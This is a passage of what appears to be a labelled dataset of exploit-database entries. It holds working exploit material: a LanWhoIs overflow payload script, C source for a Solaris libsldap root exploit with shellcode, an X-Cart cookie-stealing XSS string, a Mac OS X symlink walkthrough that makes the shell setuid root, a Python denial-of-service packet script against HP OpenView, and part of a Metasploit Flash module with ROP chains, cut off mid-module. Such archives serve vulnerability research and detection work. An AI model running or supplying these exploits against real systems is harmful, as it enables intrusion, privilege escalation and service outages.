exception may be expected and handled. *** WARNING: Unable to verify checksum for image00400000 *** ERROR: Module load completed but symbols could not be loaded for image00400000 eax=02bdfec8 ebx=02bdff14 ecx=02bdfecc edx=41414141 esi=00000000 edi=00000000 eip=00404bc8 esp=02bdfc04 ebp=02bdfecc iopl=0         nv up ei pl nz na pe nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206  image00400000+0x4bc8: 00404bc8 8b4af8          mov     ecx,dword ptr [edx-8] ds:002b:41414139=???????? 0:011> !exchain 02bdfed4: 52525252 Invalid exception stack at 42424242  registers...  EAX 00000000 ECX 52525252 EDX 7714B4AD ntdll.7714B4AD EBX 00000000 ESP 04D0F668 EBP 04D0F688 ESI 00000000 EDI 00000000 EIP 52525252   POC code: ==========  Run below script, then copy and insert payload into <QueryString> </QueryString> XML node and run the application. Next, select the address in the Results window pane and then click Query button to run a whois lookup or use the 'F3' keyboard cmd to execute and KABOOOOOOOOOOOOOOOM!!! '''  file=open(""C:\\hyp3rlinx\\LanTricks\LanWhoIs\\HELL"",""w"") payload=""A""*676+""BBBB""+""RRRR""         <--------------------#KABOOOOOOOOOOOOOOOOOOM!!! file.write(payload) file.close()  ''' Public Disclosure: =================== October 6, 2015     Exploitation Technique: ======================= Local Tested on Windows 7 SP1   Vulnerable Parameter: ====================== QueryString   ===========================================================  [+] Disclaimer Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.  by hyp3rlinx '''",injecting malicious payload into the <QueryString> node of the local XML file,1
20969,"Solaris 8 libsldap - Local Buffer Overflow (1) // source: https://www.securityfocus.com/bid/2931/info  Solaris 8 ships with a shared library that implements LDAP functionality called 'libsldap'. This library is linked to by a number of system utilities, many of them installed setuid or setgid.  Libsldap contains a buffer overflow vulnerability in it's handling of the 'LDAP_OPTIONS' environment variable.  Local attackers can exploit this vulnerability in setuid/setgid programs linked to libsldap to elevate privileges.   /** !!!PRIVATE!!!   ** noir@gsu.linux.org.tr  ** libsldap.so.1 $LDAP_OPTIONS enviroment variable overflow exploit;  **   **/    #include <stdio.h>  #define ADJUST      1   /* anathema@hack.co.za ** Solaris/SPARC shellcode ** setreuid(0, 0); setregid(0, 0); execve(""/bin/sh"", args, 0); */  char shellcode[] = ""\x90\x1a\x40\x09\x92\x1a\x40\x09\x82\x10\x20\xca\x91\xd0\x20\x08"" ""\x90\x1a\x40\x09\x92\x1a\x40\x09\x82\x10\x20\xcb\x91\xd0\x20\x08"" ""\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"" ""\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"" ""\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"";  struct type { char *string; char *path; long retaddr; };  struct type target[] =        { 	{ ""0, /usr/bin/passwd Solaris8, Sparc64"", ""/usr/bin/passwd"", 0xffbefe98 }, 	{ ""1, /usr/bin/nispasswd Solaris8, Sparc64"", ""/usr/bin/nispasswd"", 0xffbefe98 }, 	{ ""2, /usr/bin/yppasswd Solaris8, Sparc64"", ""/usr/bin/yppasswd"", 0xffbefe98 }, 	{ ""3, /usr/bin/chkey Solaris8, Sparc64 "", ""/usr/bin/chkey"", 0xffbefea8 }, 	{ ""4, /usr/lib/sendmail Solaris8, Sparc64"", ""/usr/lib/sendmail"", 0xffbefeb8 }, 	{ NULL, NULL, 0 }        };  int i; unsigned long ret_adr; char ldap[4000]; char egg[400]; char *envs[] = { ldap, egg, NULL };  main(int argc, char *argv[]) {        if(!argv[1])       {               fprintf(stderr, ""libsldap.so.1 $LDAP_OPTIONS enviroment variable \ buffer overflow\nExploit code: noir@gsu.linux.org.tr\nBug discovery: sway@hack.co.za\n\nUsage: %s target#\n\n"", argv[0]);       for(i = 0; target[i].string != NULL; i++)       fprintf(stderr,""target#: %s\n"", target[i].string);       exit(0);        }    ret_adr = target[atoi(argv[1])].retaddr;     memset(egg, 0x00, sizeof egg);   for(i = 0 ; i < 400 - strlen(shellcode) ; i +=4)   *(long *)&egg[i] =  0xa61cc013;    for (i= 0 ; i < strlen(shellcode); i++)       egg[200+i]=shellcode[i];     for ( i = 0; i <  ADJUST; i++) ldap[i]=0x58;  for (i = ADJUST; i < 4000; i+=4)     {       ldap[i+3]=ret_adr & 0xff;       ldap[i+2]=(ret_adr >> 8 ) &0xff;       ldap[i+1]=(ret_adr >> 16 ) &0xff;       ldap[i+0]=(ret_adr >> 24 ) &0xff;     } memcpy(ldap, ""LDAP_OPTIONS="", 13);   ldap[strlen(ldap) - 3] = 0x00; //ldap[3998] has to be NULL terminated  execle(target[atoi(argv[1])].path, ""12341234"", (char *)0, envs);  }",a malicious symbolic link,1
25763,"Qualiteam X-Cart 4.0.8 - 'orders.php?mode' Cross-Site Scripting source: https://www.securityfocus.com/bid/13817/info      X-Cart is prone to SQL injection and cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.      These vulnerabilities could permit remote attackers to pass malicious input to database queries, resulting in modification of query logic or other attacks. Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation. An attacker may also steal cookie-based authentication credentials and carry out other attacks.      X-Cart 4.0.8 is reportedly vulnerable. Other versions may be affected as well.  http://www.example.com/orders.php?mode='><script>alert(document.cookie)</script>",malicious input,1
367,"Apple Mac OSX - Panther Internet Connect Privilege Escalation Date: 25.07.2004 Author: B-r00t. 2004. Email: B-r00t <br00t blueyonder co uk>  Vendor: Apple  Operating System: OSX Panther (Possibly Previous Versions).  Application: Internet Connect.app  Tested: Panther 10.3.4 (Internet Connect v1.3)  Problem: Internet Connect allows any file on the file system to be altered.  Status: 0day! - Temporary Fix Included.  Description: Apples Internet Connect application creates a 'ppp.log' file in '/tmp/'. If the file already exists it is opened in append mode. If it does not exist a new file is created.  It is possible to trick Internet Connect into appending data to any file on the filesystem by creating a symlink file '/tmp/ppp.log' pointing to the file to be altered.  If the file '/tmp/ppp.log' already exists, the attack is not possible as the file is owned by user 'root' and group 'wheel': -  $ ls -l /tmp/ppp.log -rw-r--r-- 1 root wheel 807 24 Jul 23:44 /tmp/ppp.log  However, due to the Operating System clearing the '/tmp' directory during system startup and also on a regular basis due to system maintenance, it becomes possible to form the attack as shown below:  First a file is created to represent a system file, owned and only writable by user 'root'.  maki:~ # echo ""TEST"" > /etc/file_owned_by_root  maki:~ # ls -l /etc/file_owned_by_root -rw-r--r-- 1 root wheel 5 25 Jul 00:09 /etc/ file_owned_by_root  maki:~ # cat /etc/file_owned_by_root TEST  A symlink is now created in the '/tmp' directory to point to the file to be altered. It is important to realise that the link can be created as a none 'admin' or 'root' user.  maki:/tmp $ id uid=502(br00t) gid=502(br00t) groups=502(br00t)  maki:/tmp $ ln -s /etc/file_owned_by_root ppp.log  maki:/tmp $ ls -l ./ppp.log lrwxr-xr-x 1 root wheel 23 25 Jul 00:11 ./ppp.log@ -> / etc/file_owned_by_root  Now Internet Connect is opened. Under 'configuration' choose 'Other'. Enter some text into the 'Telephone Number' box (B-r00t r0x y3r w0rld!) and click 'Connect'.  'Cancel' can be clicked several seconds later.  Checking the original file '/etc/file_owned_by_root' we see the following: -  maki:~ $ cat /etc/file_owned_by_root TEST Sun Jul 25 00:20:42 2004 : Version 2.0 Sun Jul 25 00:20:43 2004 : Dialing B-r00t r0x y3r w0rld! Sun Jul 25 00:20:54 2004 : Terminating on signal 15. Sun Jul 25 00:20:58 2004 : Serial link disconnected.  As can be seen, data has been appended to the 'protected' file.  Impact: It is possible for a local user to escalate their privileges by appending data to specific system files. In addition, a malicious user may be able to render the machine unusable by corrupting important system files.  Exploit: This demonstration appends commands to the '/etc/daily' file which is executed by default at 3:15AM each day. An alternative attack might involve appending to any of the files that are sourced at system start up such as '/etc/rc.common'. This latter method is convenient if the user is able to reboot the machine.  Create our link maki:~ $ ln -s /etc/daily /tmp/ppp.log  Open Internet Connect. Internal Modem -> Configuration -> Other  Internet Connect only allows certain characters to be used for the telephone number. The background '&' character allows our command string to execute amongst the time and date strings also appended.  Telephone Number: & cd .. && cd .. && cd .. && cd .. && cd bin && chmod 4755  sh &  Click 'Connect' ...*wait (10secs) ... 'Cancel'  Check the '/etc/daily' file. maki:~ $ tail /etc/daily if [ -f /etc/security ]; then echo """" echo ""Running security:"" sh /etc/security 2>&1 | sendmail root fi  Sun Jul 25 03:10:11 2004 : Version 2.0 Sun Jul 25 03:10:11 2004 : Dialing & cd .. && cd .. && cd ..  && cd .. && cd bin && chmod 4755 sh & Sun Jul 25 03:10:15 2004 : Terminating on signal 15. Sun Jul 25 03:10:17 2004 : Serial link disconnected.  Now sit back and wait for cron to execute '/etc/daily' at 03: 15AM.  maki:~ $ date Sun Jul 25 03:13:43 CEST 2004  maki:~ $ cd /bin  maki:/bin $ ls -l sh -r-xr-xr-x 1 root wheel 603488 25 Jun 09:39 sh*  maki:/bin $ date Sun Jul 25 03:15:50 CEST 2004  maki:/bin $ ls -l sh -rwsr-xr-x 1 root wheel 603488 25 Jun 09:39 sh*  maki:/bin $ sh  maki:/bin # id uid=502(br00t) euid=0(root) gid=502(br00t)  groups=502(br00t)  All thats left to do is clean up '/etc/daily' and remove the  link '/tmp/ppp.log'   FIX: The following commands serve to provide a temporary fix  until Apple release an official update.  Open a terminal: /Applications/Utilities/Terminal.app Gain root access using 'sudo':  maki:~ $ sudo sh Password:[YOUR PASSWORD]  maki:~ # whoami root  You can copy and paste the following commands: -  /usr/bin/touch /tmp/ppp.log echo '/usr/bin/touch /tmp/ppp.log' >> /etc/daily echo '/usr/bin/touch /tmp/ppp.log' >> /etc/rc.common  These commands ensure that a '/tmp/ppp.log' file is present to prevent a user from creating a link as shown above. Alternatively the line:  /usr/bin/touch /tmp/ppp.log  can be added to each file '/etc/daily' and '/etc/rc.common' manually using an editor and root privileges.  Shoutz: Marshal-L, Ruxsaw, Haggis & Kraft. s1, Blex & the old #cheese posse (RIP). Maz ... Good Luck For The Wedding!  # milw0rm.com [2004-07-28]",corrupting important system files,1
10176,"HP OpenView Network Node Manager (OV NNM) 7.53 - Invalid DB Error Code -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1        Core Security Technologies - CoreLabs Advisory            http://www.coresecurity.com/corelabs/    HP Openview NNM 7.53 Invalid DB Error Code vulnerability    1. *Advisory Information*  Title: HP Openview NNM 7.53 Invalid DB Error Code vulnerability Advisory Id: CORE-2009-0814 Advisory URL: http://www.coresecurity.com/content/openview_nnm_internaldb_dos Date published: 2009-11-17 Date of last update: 2009-11-17 Vendors contacted: HP Release mode: Coordinated release   2. *Vulnerability Information*  Class: External Initialization of Trusted Variables [CWE-454] Impact: Denial of Service Remotely Exploitable: Yes Locally Exploitable: No Bugtraq ID: N/A CVE Name: CVE-2009-3840   3. *Vulnerability Description*  HP Openview Network Node Manager is one of the most widely-deployed network monitoring and management platforms used throughout enterprise organizations today. The platform includes many server and client-side core components with a long list of previously disclosed security bugs. In this case, a remotely exploitable vulnerability was found in the database server core component used by NNM. Exploitation of the bug does not require authentication and will lead to a remotely triggered denial of service of the internal database service.   4. *Vulnerable packages*     . HP Openview NNM 7.53  Other versions may be vulnerable but were not tested. Refer to the vendor's security bulletin for a full list.   5. *Non-vulnerable packages*  Refer to the vendor's security bulletin.   6. *Vendor Information, Solutions and Workarounds*  The vendor issued security bulletin HPSBMA02477 SSRT090177 to address the problem and provide fixes. It is available at http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c01926980  The database service of HP Openview Network Node Manager is remotely accessible on port 2690/tcp. Restricting or blocking access to that port will prevent exploitation but may prevent normal operation of Openview NNM.   7. *Credits*  This vulnerability was discovered and researched by Damian Frizza from Core Security Technologies.   8. *Technical Description / Proof of Concept Code*   8.1. *HP Openview NNM 7.53 Embedded DB Remote Denial Of Service*  HP Openview Network Node Manager includes an embedded database engine service that is enabled by default and accepts remote connections on port 2690/tcp. The service is implemented by the 'ovdbrun.exe' which is started automatically on boot. For certain transactions upon receiving a packet from the network the service will attempt to determine and display an error code string based on an error code number specified in the packet. By sending a specifically crafted packet with an invalid error code number it is possible to remotely trigger an exception that forces abnormal termination of the service. It is unlikely that the bug could be exploited for anything other than a remote denial of service.  The following code excerpt explains the problem:  /----- 005FED51   MOVZX EDX,BYTE PTR SS:[ESP+2]     #FCFF 005FED56   MOVSX ECX,WORD PTR SS:[ESP+3] 005FED5B   CMP ECX,-1 005FED5E   MOVSX EAX,WORD PTR SS:[ESP+5]     #FCFF 005FED63   MOV DWORD PTR DS:[ESI+10],EDX 005FED66   MOV EDX,DWORD PTR SS:[ESP+7] 005FED6A   MOV DWORD PTR DS:[ESI+14],ECX 005FED6D   MOV DWORD PTR DS:[ESI+18],EAX 005FED70   MOV DWORD PTR DS:[ESI+C],EDX 005FED73   JGE SHORT ovdbrun.005FED7E 005FED75   CMP EAX,-1 005FED78   JGE SHORT ovdbrun.005FED7E 005FED7A   CMP ECX,EAX 005FED7C   JE SHORT ovdbrun.005FED83 005FED7E   MOV EAX,1 005FED83   ADD ESP,0C 005FED86   RETN  - -----/  The code above checks for an error condition based on the value of an Error Code field in the inbound network packet. An error condition is explicitly handled if the Error Code value is less or equal than -1 in which case a MessageBox with a corresponding descriptive error string will be presented to the user. However by crafting a packet with any negative value in the Error Code field different that -1 the lookup for the corresponding error string will fail triggering a non-recoverable error and thus terminating the server process.  The following python code can be used to reproduce the bug:  /----- #!python import socket import struct  a =  struct.pack('<b', 2) a += struct.pack('<H', 0) a += struct.pack('<H',0xFEFF) a += struct.pack('<H',0xFEFF) a += ""1234""  target_ip = 'X.X.X.X'  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) s.connect ((target_ip, 2690))  s.send(a) s.close()  - -----/    8.2. *Additional information: Low severity bugs in ActiveDom.ocx ActiveX*  The ActiveX control 'ActiveDom.ocx' is shipped with HP Openview NNM 7.53 and installed by default. The control is prone to multiple memory corruption bugs due to erroneous handling of overly long strings passed to multiple methods. These bugs are considered of low severity because the control is not configured as Safe for Scripting or Safe for Initialization [1] and therefore cannot be exploited without explicit user consent. Since the control was reported by the vendor as not used nor required by any component of OpenView NNM, finding deployed systems with security configuration settings changed to allow exploitation of these bugs is very unlikely. Nonetheless information about them is included below for the purpose of completeness in the documentation of this advisory.  Some of the ActiveX control's methods with implementation flaws are:  /----- DisplayName(str) AddGroup(str) InstallComponent(str) Subscribe(str, str, int)  - -----/  The following excerpt from method DisplayName() demonstrates the problem:  /----- 2000D408   MOV DWORD PTR SS:[EBP-4],-1 2000D40F   JMP SHORT ACTIVE~1.2000D3D6 2000D411   MOV EAX,ACTIVE~1.200361A0 2000D416   JMP <JMP.&MSVCRT.__CxxFrameHandler> 2000D41B   MOV EAX,ACTIVE~1.2000D4A8 2000D420   CALL <JMP.&MSVCRT._EH_prolog> 2000D425   SUB ESP,10 2000D428   PUSH EBX 2000D429   PUSH ESI 2000D42A   PUSH EDI 2000D42B   MOV DWORD PTR SS:[EBP-10],ESP 2000D42E   MOV DWORD PTR SS:[EBP-14],ECX 2000D431   XOR EBX,EBX 2000D433   MOV DWORD PTR SS:[EBP-4],EBX 2000D436   LEA ESI,DWORD PTR DS:[ECX+28] 2000D439   MOV ECX,DWORD PTR DS:[ESI]        ; ESI = 00038178 2000D43B   MOV EAX,DWORD PTR DS:[ECX]        ; 2000D43D   CALL DWORD PTR DS:[EAX+48]        ;  - -----/  The following HTML code can be used to trigger the bug:  /----- <html> <object classid='clsid:A801FD2B-6FA8-11D0-BB85-00AA00A7EAAE' id='target'      </object>  <script> a = """" for (i = 0; i < 10000; i++)    a = a + ""A"" target.DisplayName(a) </script> </html>   - -----/    9. *Report Timeline*  . 2009-08-12: Core Security Technologies notifies the HP Software Security Response Team (SSRT) of the vulnerability and preliminary schedule to publish the corresponding security advisory on September 8th 2009. Core asks for acknowledgement of the email within 2 working days and whether HP SSRT prefers to receive the technical description of the bug encrypted or in plaintext.  . 2009-08-12: HP SSRT asks Core to send the technical description of the vulnerability encrypted using the PGP key with id 0x08B83D45.  . 2009-08-14: Core Security Technologies sends technical details encrypted to HP SSRT.  . 2009-08-18: HP SSRT informs Core that HP engineering have been notified and will notify Core when they have a schedule estimate. SSRT assigned the IDs SSRT090177 and SSRT090178 to the vulnerabilities reported by Core.  . 2009-08-27: Core requests a status update from HP SSRT.  . 2009-08-27: HP SSRT informs Core that the vulnerabilities are in third-party code and that the third-party vendor has been notified but there isn't a schedule for fixes yet. HP SSRT indicates that it is sure HP will not have a solution ready by September 7th.  . 2009-08-27: Core informs the HP team that the publication was re-scheduled to September 21st and requests an update to continue coordinating the release of fixes and publication of the advisory as soon as possible.  . 2009-08-28: The HP team informs Core that the third party if planning a release on October 30th for the first vulnerability. SSRT also notes that ActiveX vulnerabilities are still being investigated.  . 2009-08-31: Core Security Technologies acknowledges the information sent by HP SSRT.  . 2009-09-01: The HP team communicates that they will inform Core Security Technologies when the fix is available.  . 2009-09-04: Core asks the HP SSRT to map HP's internal IDs to each of the reported vulnerability.  . 2009-09-04: The HP SSRT indicates that SSRT090177 corresponds to the embedded database vulnerability and SSRT090178 to the ActiveX bugs.  . 2009-09-10: Core Security Technologies notifies HP SSRT that publication of the advisory has been re-scheduled to October 30th to be able to coordinate the release with the issuance of fixes by the third party vendor and that if non-third-party vulnerabilities (the ActiveX bugs) could be fixed earlier they would be described in a separate advisory.  . 2009-09-11: HP SSRT says that it will send any new information to Core on the ActiveX bugs if they have something to publish before October 30th.  . 2009-09-21: The HP team informs Core that they are having some problems reproducing the ActiveX vulnerabilities reported. The NNM engineers have used the provided proof-of-concept exploit but did not see any effect. SSRT asks if an overflow was confirmed, if process failure was detected and if a debugger or a different procedure was used.  . 2009-09-21: Core Security Technologies notifies the HP SSRT that the proof of concept crash can be observed using a classic debugger or a just-in-time debugger that is attached only after an abnormal exception is detected. Core also sends HP SSRT another proof of concept HTML code that crashes the ActiveX and can be observed without the need of a debugger.  . 2009-09-22: The HP team acknowledges previous email from Core with the new PoC to reproduce the crashes without a debugger.  . 2009-10-06: Core requests a status update from the SSRT noting that it hasn't received any update since September 22nd. The advisory is still scheduled for publication on October 30th and Core is waiting for confirmation that the ActiveX bugs were reproduced and the fix for them could be published earlier separately.  . 2009-10-09: SSRT updates indicating that fixes from the third party for SSRT090177 have been received and HP is currently in the process of testing them on all platforms expecting an update by October 16th. The ActiveX bugs have been reproduced and HP determined that the vulnerable control is not necessary for NNM. HP will recommend customers to set the kill bit for the control (clsid:A801FD2B-6FA8-11D0-BB85-00AA00A7EAAE) as workaround.  . 2009-10-19: Core requests a status update and confirmation that HP will be ready to release fixes by October 30th. Core asks if fixes will be issued for all vulnerable versions of NNM, whether the fixes or patches will remove the unnecessary ActiveX control or just ask customers to implement the workaround. Core requests the complete lists of vulnerable versions and platforms of NNM and asks if the patches will include fixes to other bugs. Also, Core notes that the vendor of the third party component has been identified and that since the bug may affect other products Core will start a separate vulnerability report process directly with that vendor.  . 2009-11-02: Email from Core asking for a status update and an acknowledgement and response to the questions from the previous email. Core notes that the previously agreed publication date for the advisory has already passed without any update from HP. The publication date has been unilaterally moved to Wednesday November 4th. 2009 and is considered final pending a response from HP.  . 2009-11-03: Response from HP SSRT stating that there is not an estimated release date for patches to some platforms. With regards to the ActiveX bugs, a security bulletin will be published on November 9th recommending setting the kill bit.  . 2009-11-03: Core indicates that since there isn't an estimated patch release date for missing platforms the advisory will be published on November 9th and will include guidance on how to implement workarounds for both problems. Core asks SSRT about the potential impact of blocking or restricting access to the vulnerable service as a workaround.  . 2009-11-05: SSRT suggests that given that Core advisory will be published earlier than HP's security bulletin it should have workarounds for all platforms and not just for the ones that may not have a patch available afterwards. HP is still investigating the impact of blocking or restricting access to the vulnerable port. SSRT asks if Core wants any acknowledgement in its security bulletin  . 2009-11-05: Core asks what is the planned publication date for HP's bulletin and requests that the bulletin credits the discoverer (Damian Frizza). Provided that the estimated date for publishing the bulletin is not unreasonable Core would rather schedule the publication of the advisory to match HP's.  . 2009-11-06: SSRT informs that their estimate is to have hotfixes available internally by November 13th and released along with the corresponding security bulletins by November 17th. SSRT ask whether CVE numbers should be assigned by HP or provided by Core.  . 2009-11-06: Core re-schedules publication to November 17th. Core asks SSRT to assign the CVE numbers.  . 2009-11-12: HP SSRT reports that the ActiveX control is not marked as safe for scripting or safe for initialization by default and thus the buffer overflows in its methods do not seem to be security issues. Asks if Core still considers them security vulnerabilities.  . 2009-11-16: HP SSRT provides the CVE id assigned to the denial of service bug. Indicates that the vendor's security bulletin will not suggest any workarounds as the effect of blocking or restricting access to the vulnerable service has not been determined.  . 2009-11-16: Core confirms that the ActiveX control is not marked as safe for scripting or initialization which greatly diminishes the relevance of the reported bugs. Nonetheless, the information about the bugs will be included in the advisory for the purpose of completeness and to let users verify, and if necessary correct, the control's configuration settings. Core still recommends the vendor to remove the unnecessary control from installation packages and fix the reported bugs to avoid potential introduction of flaws if it becomes a used control in the future or should an alternative exploitation vector be found.  . 2009-11-17: Publication of HP Security Bulletin SSRT090177.  . 2009-11-17: Advisory CORE-2009-0814 published.    10. *References*  [1] Safe Initialization and Scripting for ActiveX Controls. http://msdn.microsoft.com/en-us/library/aa751977(VS.85).aspx [2] How to stop an ActiveX control from running in Internet Explorer. http://support.microsoft.com/kb/240797   11. *About CoreLabs*  CoreLabs, the research center of Core Security Technologies, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://www.coresecurity.com/corelabs.   12. *About Core Security Technologies*  Core Security Technologies develops strategic solutions that help security-conscious organizations worldwide develop and maintain a proactive process for securing their networks. The company's flagship product, CORE IMPACT, is the most comprehensive product for performing enterprise security assurance testing. CORE IMPACT evaluates network, endpoint and end-user vulnerabilities and identifies what resources are exposed. It enables organizations to determine if current security investments are detecting and preventing attacks. Core Security Technologies augments its leading technology solution with world-class security consulting services, including penetration testing and software security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core Security Technologies can be reached at 617-399-6980 or on the Web at http://www.coresecurity.com.   13. *Disclaimer*  The contents of this advisory are copyright (c) 2009 Core Security Technologies and (c) 2009 CoreLabs, and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.   14. *PGP/GPG Keys*  This advisory has been signed with the GPG key of Core Security Technologies advisories team, which is available for download at http://www.coresecurity.com/files/attachments/core_security_advisories.asc. -----BEGIN PGP SIGNATURE----- Version: GnuPG v1.4.8 (MingW32) Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/  iEYEARECAAYFAksDICYACgkQyNibggitWa2//ACdFpN6SK4B59Iza5Nq88oASfat YhoAn24UcNlJ/lpKv4brl4d6mctKfwMF =cR49 -----END PGP SIGNATURE-----",sending a specifically crafted packet with an invalid error code number,1
20624,"Adobe Flash Player 11.3 - Font Parsing Code Execution (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for more information on licensing and terms of use. #   http://metasploit.com/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = AverageRanking  	include Msf::Exploit::Remote::HttpServer::HTML  	def initialize(info={}) 		super(update_info(info, 			'Name'           => ""Adobe Flash Player 11.3 Font Parsing Code Execution"", 			'Description'    => %q{ 					This module exploits a vulnerability found in the ActiveX component of Adobe 				Flash Player before 11.3.300.271. By supplying a corrupt Font file used by the SWF, 				it is possible to gain arbitrary remote code execution under the context of the 				user, as exploited in the wild. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'Alexander Gavrun', #Through iDefense 					'sinn3r', 					'juan vazquez' 				], 			'References'     => 				[ 					[ 'CVE', '2012-1535' ], 					[ 'OSVDB', '84607'], 					[ 'BID', '55009'], 					[ 'URL', 'http://labs.alienvault.com/labs/index.php/2012/cve-2012-1535-adobe-flash-being-exploited-in-the-wild/' ], 					[ 'URL', 'http://vrt-blog.snort.org/2012/08/cve-2012-1535-flash-0-day-in-wild.html' ], 					[ 'URL', 'http://contagiodump.blogspot.com.es/2012/08/cve-2012-1535-samples-and-info.html' ] 				], 			'Payload'        => 				{ 					'Space'    => 1024 				}, 			'DefaultOptions'  => 				{ 					'InitialAutoRunScript' => 'migrate -f' 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					# Tested successfully on: 					# Flash 11.3.300.268 					# Flash 11.3.300.265 					# Flash 11.3.300.257 					[ 'Automatic', {} ], 					[ 						'IE 6 on Windows XP SP3', 						{ 							'Rop'    => nil 						} 					], 					[ 						'IE 7 on Windows XP SP3', 						{ 							'Rop'    => nil 						} 					], 					[ 						'IE 8 on Windows XP SP3', 						{ 							'Rop' => true 						} 					] 				], 			'Privileged'     => false, 			'DisclosureDate' => ""Aug 9 2012"", 			'DefaultTarget'  => 0))  		register_options( 			[ 				OptEnum.new('ROP', [true, ""The ROP chain to use"", 'SWF', %w(SWF JRE)]), 			], self.class) 	end  	def nop 		return make_nops(4).unpack(""L"")[0].to_i 	end  	def get_payload(t, flash_version=nil) 		if t['Rop'].nil? 			p = [ 				0x0c0c0c0c, # mapped at 1e0d0000 				0x0c0c0c0c, 				0x0c0c0c0c, # mapped at 1e0d0008 			].pack(""V*"")  			p << payload.encoded 		else 			if datastore['ROP'] == 'SWF' and flash_version =~ /11,3,300,257/  				print_status(""Using Rop Chain For Flash: #{flash_version}"") 				stack_pivot = [ 					0x10004171, # POP EDI # POP ESI # RETN (1e0d0000) 					0x0c0c0c0c, 					0x1001d891, # xchg eax, esp # ret (1e0d0008) 				].pack(""V*"")  				rop = [ 					0x10241001, # POP EAX # RETN (Flash32_11_3_300_257.ocx) 					0x106e3384, # <- *&VirtualProtect() 					0x1029de2f, # MOV EAX,DWORD PTR DS:[EAX] # RETN (Flash32_11_3_300_257.ocx) 					0x106add37, # XCHG EAX,ESI # RETN (Flash32_11_3_300_257.ocx) 					0x1064e000, # POP EBP # RETN (Flash32_11_3_300_257.ocx) 					0x10175c57, # ptr to 'jmp esp' (from Flash32_11_3_300_257.ocx) 					0x106a4010, # POP EBX # RETN (Flash32_11_3_300_257.ocx) 					0x00000201, # <- change size to mark as executable if needed (-> ebx) 					0x104de800, # POP ECX # RETN (Flash32_11_3_300_257.ocx) 					0x10955000, # W pointer (lpOldProtect) (-> ecx) 					0x10649003, # POP EDI # RETN (Flash32_11_3_300_257.ocx) 					0x10649004, # ROP NOP (-> edi) 					0x10649987, # POP EDX # RETN (Flash32_11_3_300_257.ocx) 					0x00000040, # newProtect (0x40) (-> edx) 					0x10241001, # POP EAX # RETN (Flash32_11_3_300_257.ocx) 					nop,        # NOPS (-> eax) 					0x1060e809, # PUSHAD # RETN (Flash32_11_3_300_257.ocx) 				].pack(""V*"")  			elsif datastore['ROP'] == 'SWF' and flash_version =~ /11,3,300,265/  				print_status(""Using Rop Chain For Flash: #{flash_version}"") 				stack_pivot = [ 					0x10004171, # POP EDI # POP ESI # RETN (1e0d0000) 					0x0c0c0c0c, 					0x1001d6d3, # xchg eax, esp # ret (1e0d0008) 				].pack(""V*"")  				rop = [ 					0x10241002, # POP EAX # RETN (Flash32_11_3_300_265.ocx) 					0x106e338c, # <- *&VirtualProtect() 					0x1029ea04, # MOV EAX,DWORD PTR DS:[EAX] # RETN (Flash32_11_3_300_265.ocx) 					0x103d60b8, # XCHG EAX,ESI # RETN (Flash32_11_3_300_265.ocx) 					0x105cc000, # POP EBP # RETN (Flash32_11_3_300_265.ocx) 					0x1001c5cd, # ptr to 'jmp esp' (from Flash32_11_3_300_265.ocx) 					0x10398009, # POP EBX # RETN (Flash32_11_3_300_265.ocx) 					0x00000201, # <- change size to mark as executable if needed (-> ebx) 					0x10434188, # POP ECX # RETN (Flash32_11_3_300_265.ocx) 					0x10955000, # W pointer (lpOldProtect) (-> ecx) 					0x105c1811, # POP EDI # RETN (Flash32_11_3_300_265.ocx) 					0x105c1812, # ROP NOP (-> edi) 					0x10650602, # POP EDX # RETN (Flash32_11_3_300_265.ocx) 					0x00000040, # newProtect (0x40) (-> edx) 					0x10241002, # POP EAX # RETN (Flash32_11_3_300_265.ocx) 					nop,        # NOPS (-> eax) 					0x1062800f, # PUSHAD # RETN (Flash32_11_3_300_265.ocx) 				].pack(""V*"")  			elsif datastore['ROP'] == 'SWF' and flash_version =~ /11,3,300,268/  				print_status(""Using Rop Chain For Flash: #{flash_version}"") 				stack_pivot = [ 					0x10004171, # POP EDI # POP ESI # RETN (1e0d0000) 					0x0c0c0c0c, 					0x1001d755, # xchg eax, esp # ret (1e0d0008) 				].pack(""V*"") 				rop = [ 					0x1023e9b9, # POP EAX # RETN (Flash32_11_3_300_268.ocx) 					0x106e438c, # <- *&VirtualProtect() 					0x10198e00, # MOV EAX,DWORD PTR DS:[EAX] # RETN (Flash32_11_3_300_268.ocx) 					0x106ddf15, # XCHG EAX,ESI # RETN (Flash32_11_3_300_268.ocx) 					0x1035f000, # POP EBP # RETN (Flash32_11_3_300_268.ocx) 					0x10175c28, # ptr to 'jmp esp' (from Flash32_11_3_300_268.ocx) 					0x105e0013, # POP EBX # RETN (Flash32_11_3_300_268.ocx) 					0x00000201, # <- change size to mark as executable if needed (-> ebx) 					0x10593801, # POP ECX # RETN (Flash32_11_3_300_268.ocx) 					0x1083c000, # RW pointer (lpOldProtect) 